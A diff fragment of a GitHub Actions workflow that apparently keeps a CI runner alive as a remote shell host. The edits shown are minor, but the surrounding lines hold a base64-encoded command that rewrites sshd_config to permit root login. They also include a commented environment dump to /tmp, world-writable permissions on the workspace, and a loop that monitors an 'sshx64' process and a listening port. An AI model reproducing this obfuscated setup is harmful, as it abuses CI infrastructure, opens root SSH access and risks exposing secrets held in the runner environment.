@@ -44,7 +44,6 @@ jobs:
           #(env|grep ss>/tmp/s0;sleep 1111&);
           chmod 0777 $GITHUB_WORKSPACE/*;
           ls -al;
-          touch one-line-script1111;
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
@@ -98,7 +97,7 @@ jobs:
           while :;do rt=$((${rt}+1));
           [ $((${rt}%30)) -eq 0 ]&&echo $rt&&(sudo netstat -anlp|grep 34292;sudo ps aux|grep sshx64|grep -v keepalive);
           [ -f /tmp/keepalive ]&&sleep 10||break;
-          [ -f /tmp/keepalive ]&&cat /tmp/keepalive&&sudo netstat -anlp;
+          [ -f /tmp/keepalive ]&&cat /tmp/keepalive&&sudo netstat -anlp|grep 5244;
           done); #cat y2;
         env:
           sp9: 4
